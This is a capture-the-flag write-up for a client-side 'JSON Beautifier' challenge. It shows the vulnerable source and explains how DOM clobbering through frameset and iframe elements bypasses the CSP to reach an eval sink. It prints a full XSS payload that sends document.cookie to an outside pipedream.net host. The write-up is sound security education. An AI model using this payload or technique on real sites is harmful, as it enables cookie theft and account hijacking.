## Skills required: DOM Clobbering for the most part, research and be organized

I'm surprised by this **purely client-side challenge**.
It is a very simplistic, elegant challenge with no distractions and 0 dependency.

For the role part, I mainly scouted the starting parts, all the later parts including the eventual payload are done by Ozetta.

## Solution:

We need to create a **self-XSS** payload with a JSON Beautifier application and send the payload to an admin bot for the cookie i.e. the flag.
As the source is short I'll just include them here:

<details>
  <summary>main.js</summary>

```js
window.inputBox = document.getElementById('json-input');
window.outputBox = document.getElementById('json-output');
window.container = document.getElementById('container');

const defaults = {
	opts: {
		cols: 4
	},
	debug: false,
};

const beautify = () => {
	try {
		userJson = JSON.parse(inputBox.textContent);
	} catch (e){
		return;
	};

	loadConfig();
	const cols = this.config?.opts?.cols || defaults.opts.cols;
	output = JSON.stringify(userJson, null, cols);

	console.log(this.config?.opts)
	
	if(this.config?.debug || defaults.debug){
		eval(`beautified = ${output}`);
		return beautified;
	};
	
	outputBox.innerHTML = `<pre>${output}</pre>`
};

const saveConfig = (config) => {
	localStorage.setItem('config', JSON.stringify(config));
};

const loadConfig = () => {
	if (localStorage.hasOwnProperty('config')){
		window.config = JSON.parse(localStorage.getItem('config'))
	};
}

console.log('hello from JSON beautifier!')

inputBox.addEventListener("DOMCharacterDataModified", () => {
	beautify();
});

if((new URL(location).searchParams).get('json')){
	const jsonParam = (new URL(location).searchParams).get('json');
	inputBox.textContent = jsonParam;
};

beautify();  
```
</details>

<details>
  <summary>Application web page</summary>

```html
<html>
	<head>
		<script defer src="/static/js/main.js"></script>
		<link rel="stylesheet" href="/static/css/style.css">
		<title>JSON Beautifier</title>
	</head>
	<h1>JSON Beautifier</h1>
	<p>Enter your ugly JSON on the left, see the beautified JSON on the right!</p>
	<body>
		<div class="float-container" id="container">
			<div class="float-child" id="json-input" contenteditable autofocus></div>
			<div class="float-child" id="json-output" contenteditable></div>
		</div>
	</body>
</html>
```
</details>

Some quick and obvious keypoints:
- `` eval(`beautified = ${output}`); `` is the obvious sink.
- `` outputBox.innerHTML = `<pre>${output}</pre>` `` is the obvious starting point. However, the page has CSP-Policy: `script-src 'unsafe-eval' 'self'; object-src 'none';`
  - There's no 'unsafe-inline' in `script-src`, namely we cannot inject `<script>` tags *with inline content* or inline JavaScript events like everyone's favorite `<img onerror='fetch(...)'>`, of course we can't include scripts from other domains either.
  - `object-src` removes `<object>`, `<embed>` and `<applet>`.
  - A good review of CSP-filter bypassing is written by [Thakur](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d). It is not particularly useful during the CTF because the sink is well-known and XSS isn't even the main skill in question.

Thinking backwards:
- We have to corrupt `output`, which is created from:

  ```js
  const cols = this.config?.opts?.cols || defaults.opts.cols;
	output = JSON.stringify(userJson, null, cols);
  ```
- It's generally harder to screw up security for `JSON.stringify` when compared to other serializations like in PHP or Java, but here we see an example. **`cols` is definitely fishy so let's look at [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify#space)**
  ![MDN JSON.stringify](https://i.imgur.com/BvNNWAn.png)
- If we use a `` ` `` for a string array we can get string context bypass:
  ![String context bypass with \` for string array, perfectly normal JavaSccript behavior](https://i.imgur.com/D5pfxrj.png)
- We need to set `this.config?.opts?.cols` to some *string* that we control as well as `this.config?.debug` to any truthy value. A good candidate is **[DOM clobbering](https://portswigger.net/research/dom-clobbering-strikes-back)** (I also considered prototype pollution but it is very unlikely in retrospect)

### DOM Clobbering

Here comes the true challenge which got over my head during the CTF for a couple of reasons which I'll summarize. While my knowledge to DOM clobbering is limited to *knowing that it is a thing*, fortunately I wasn't playing alone and had ample of chances to learn. (I'm reverse-engineering the thought process)

- For a very systematic approach, a [good resource by PortSwigger](https://portswigger.net/research/dom-clobbering-strikes-back) describes how the properties can be enumerated. After enumeration, only **frameset:cols** can be string (textarea:cols is number).
- **frameset** is a [really special old-school HTML element](https://html.spec.whatwg.org/multipage/obsolete.html#frameset). HTML documents using `<frameset>` [cannot at the same time use `<body>`](https://www.doyler.net/security-not-included/frameset-xss).
  ![image](https://user-images.githubusercontent.com/114584910/212973636-f723e6a0-3791-4860-965c-dabb0f90426c.png)
- As CSP `frame-src` is absent, we can inject `<iframe>`s into the page, which solves 2 problems:
  - We can now use `<frameset>`, despite it being in a iframe
  - `<iframe>` is also a common payload for DOM clobbering ([DOM Clobbering payload generator](https://domclob.xyz/domc_payload_generator/))
- At this moment we can already have ``"<iframe name=config srcdoc='<frameset id=opts cols=&quot;`&quot;>'></iframe>"``
  
  ![image](https://user-images.githubusercontent.com/114584910/212976594-78e029da-4054-4fb8-a423-5aa76cc4bf78.png)

- ``"<iframe name=config srcdoc='<frameset id=debug><frameset id=opts cols=&quot;`&quot;>'></iframe>"`` works as well.

### The rest

It is important to list the different steps of the payload:
1. A CSP-limited XSS payload will be used for DOM clobbering to set the different properties
2. `beautify()` should be run again, this time with our javascript payload prepended with `` `+ ``
   - This can be done by including `main.js` again in a page with `#json-input`
4. Remember that there can be no body for frameset page.

With all these in mind, let's greet our beautiful actual final payload (partially censored):

``"<iframe srcdoc='<textarea id=json-input>[&quot;`+(location=`https://XXXX.m.pipedream.net/`+document.cookie)//&quot;]</textarea><iframe name=config srcdoc=&apos;<frameset id=debug><frameset id=opts cols=&quot;`&quot;>&apos;></iframe><script src=static/js/main.js></script>'>"``

Summarising what will happen:

1. The payload string will be parsed and stringified normally, injecting an iframe containing:
   - textarea with our true javascript payload prepended with `` `+ ``
   - another iframe containing our clobbering framesets
   - the script `main.js`
2. The framesets will be loaded and properties clobbered.
3. The script `main.js` is loaded within the iframe
4. the textarea content in iframe will be stringified with `` ` ``
5. Our javascript payload will be evaluated

**FLAG:** `idek{w0w_th4t_JS0N_i5_v3ry_beautiful!!!}`

## Reflections:

- I knew about DOM Clobbering, the articles by PortSwigger and payload generator; yet I was not very familiar with the specifics of it and was confused by *normal* clobbering and *string* clobbering.
- I was quite lost in the actual process due to a general infamiliarity with CSPs.
- While restructing the payload bottom-up from `frameset`, direct XSS failed due to `body` issue. After some consultation and research I was able to catch that.
- There are some details like encodeURIComponent and HTML entities that I often forget

## Trivia:

- The safe equivalent to `eval` is `JSON.parse`. Converting the `space` parameter to number could be an alternative, but please still avoid `eval`.
